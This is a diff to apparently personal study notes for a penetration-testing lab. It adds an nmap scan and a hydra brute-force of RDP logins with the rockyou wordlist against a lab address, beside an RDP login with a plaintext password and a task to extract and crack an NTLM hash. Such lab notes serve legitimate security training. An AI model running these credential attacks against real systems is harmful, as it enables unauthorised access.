@@ -196,6 +196,10 @@ Lab 1 - Follow the steps outlined in this section and find the flag on the nelly
 
 Lab 2 - Access VM #2 via RDP as user nadine with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use best66.rule for the cracking process and enter the plain text password as answer to this exercise.
 >``` shell
+>kali@kali:~$ nmap -p 3389 -sV 192.168.241.227
+>
+>kali@kali:~$ hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.241.227
+>
 >xfreerdp3 /u:nadine /p:123abc /v:192.168.241.227 /cert:ignore
 >
 >PS C:\Windows\system32> Get-LocalUser
